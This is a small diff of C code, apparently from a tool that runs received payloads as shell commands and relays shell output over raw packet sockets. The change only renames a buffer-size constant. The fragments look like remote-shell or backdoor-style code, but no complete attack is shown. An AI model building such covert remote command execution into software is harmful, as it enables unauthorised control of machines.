@@ -82,7 +82,7 @@ struct server_ctx {
 };
 
 static void server_send_tagged(server_ctx_t *ctx, const char *tag, const char *fmt, ...) {
-    char message[MAX_PAYLOAD_SIZE];
+    char message[MAX_DATA_SIZE];
     va_list ap;
     int prefix_len;
     int payload_len;
@@ -366,7 +366,7 @@ static int server_exec(server_ctx_t *ctx, const u8 *payload, size_t payload_size
         log_error("server_launch", "event=empty_payload");
         return -1;
     }
-    static char command_buf[MAX_PAYLOAD_SIZE + 1];
+static char command_buf[MAX_DATA_SIZE + 1];
     if (payload_size > sizeof(command_buf) - 1) {
         log_error("server_launch", "event=payload_overflow len=%zu", payload_size);
         return -1;
@@ -389,7 +389,7 @@ static void server_handle_shell_event(server_ctx_t *ctx, pack_t *packet) {
     if (!ctx || ctx->sockfd < 0 || sh_fd < 0 || !packet) return;
 
     socklen_t saddr_len = sizeof(struct sockaddr_ll);
-    ssize_t ret = read(sh_fd, packet->payload, MAX_PAYLOAD_SIZE);
+    ssize_t ret = read(sh_fd, packet->payload, MAX_DATA_SIZE);
 
     // Проверка успешности чтения из sh_fd
     if (ret <= 0) return; // Если чтение не удалось, выходим
